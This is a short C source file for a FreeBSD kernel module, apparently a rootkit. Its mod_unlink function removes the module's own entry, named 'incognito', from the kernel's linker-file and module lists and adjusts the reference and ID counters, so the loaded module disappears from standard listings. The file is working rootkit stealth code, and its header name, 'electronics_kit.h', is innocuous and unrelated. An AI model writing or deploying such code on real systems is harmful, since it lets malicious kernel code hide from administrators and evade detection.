#include "electronics_kit.h"

int mod_unlink(struct module *module, int cmd, void *arg)
{
	struct linker_file *lf;
	struct module *mod;

	sx_xlock(&kld_sx);

	/* Decrement the current kernel image's reference count. */
	(&linker_files)->tqh_first->refs--;

	/*
	 * Iterate through the linker_files list, looking for LINKER_FILE.
	 * If found, decrement next_file_id and remove from list.
	 */
	TAILQ_FOREACH(lf, &linker_files, link) {
		if (strcmp(lf->filename, LINKER_FILE) == 0) {
			next_file_id--;
			TAILQ_REMOVE(&linker_files, lf, link);
			break;
		}
	}

	sx_xunlock(&kld_sx);

	sx_xlock(&modules_sx);

	/*
	 * Iterate through the modules list, looking for "incognito."
	 * If found, decrement nextid and remove from list.
	 */
	TAILQ_FOREACH(mod, &modules, link) {
		if (strcmp(mod->name, MODULE_NAME) == 0) {
			nextid--;
			TAILQ_REMOVE(&modules, mod, link);
			break;
		}
	}

	sx_xunlock(&modules_sx);

	return 0;
}
